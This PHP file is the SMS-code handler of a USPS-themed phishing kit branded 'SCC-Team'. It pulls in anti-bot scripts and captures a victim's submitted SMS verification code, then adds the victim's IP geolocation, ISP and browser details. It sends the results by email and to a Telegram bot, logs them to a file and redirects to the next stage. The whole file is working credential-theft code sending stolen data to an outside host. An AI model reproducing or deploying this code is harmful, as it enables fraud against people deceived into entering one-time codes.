<?php
/*
  ██████     ▄████▄      ▄████▄        ▄▄▄█████▓   ▓█████     ▄▄▄       ███▄ ▄███▓
▒██    ▒    ▒██▀ ▀█     ▒██▀ ▀█        ▓  ██▒ ▓▒   ▓█   ▀    ▒████▄    ▓██▒▀█▀ ██▒
░ ▓██▄      ▒▓█    ▄    ▒▓█    ▄       ▒ ▓██░ ▒░   ▒███      ▒██  ▀█▄  ▓██    ▓██░
  ▒   ██▒   ▒▓▓▄ ▄██▒   ▒▓▓▄ ▄██▒      ░ ▓██▓ ░    ▒▓█  ▄    ░██▄▄▄▄██ ▒██    ▒██ 
▒██████▒▒   ▒ ▓███▀ ░   ▒ ▓███▀ ░        ▒██▒ ░    ░▒████▒    ▓█   ▓██▒▒██▒   ░██▒
▒ ▒▓▒ ▒ ░   ░ ░▒ ▒  ░   ░ ░▒ ▒  ░        ▒ ░░      ░░ ▒░ ░    ▒▒   ▓▒█░░ ▒░   ░  ░
░ ░▒  ░ ░     ░  ▒        ░  ▒             ░        ░ ░  ░     ▒   ▒▒ ░░  ░      ░
░  ░  ░     ░           ░                ░            ░        ░   ▒   ░      ░   
      ░     ░ ░         ░ ░                           ░  ░         ░  ░       ░   
            ░           ░                                                         
*/
error_reporting(0);
session_start();
include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php"; 
include "../../email.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;


$InfoDATE = date("d-m-Y h:i:sa");

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$countryCode = $IP_LOOKUP->countryCode. "\r\n";
$regionName    = $IP_LOOKUP->regionName . "\r\n";
$lat    = $IP_LOOKUP->lat . "\r\n";
$lon    = $IP_LOOKUP->long . "\r\n";
$timezone    = $IP_LOOKUP->timezone . "\r\n";
$isp    = $IP_LOOKUP->isp . "\r\n";
$as    = $IP_LOOKUP->as . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";



$hostname = gethostbyaddr($ip);
$message = "[========== [+] ♠️ ⚡ SCC-Team USPS RZLT(Info) ⚡ ♠️ [+] ===========]\r\n";
$message .= "|SMS1 		 : ".$_POST['sms1']."\r\n";
$message .= "[========== [+] ♠️ ⚡ IP INFO ⚡ ♠️ [+]==========]\r\n";
$message .=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."country code: " .$countryCode."lat: " .$lat."lon: " .$lon."timezone: " .$timezone."isp: " .$isp."as: " .$as;
$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[========== [+] ♠️ ⚡ SCC-Team USPS RZLT(Info) ⚡ ♠️ [+]==========]\r\n";
$send = $email; 
$subject = "♠️ (".$_SESSION["name"].") SMS1 USPS RZLT ♠️ $ip";
$headers = "From: SCC-Team USPS<info@sccteam.com>";
mail($send,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$save=fopen("../../USPS_SCC_RZLT.txt","a+");
fwrite($save,$message);
fclose($save);


HEADER("Location: ../sms2.php");

?>
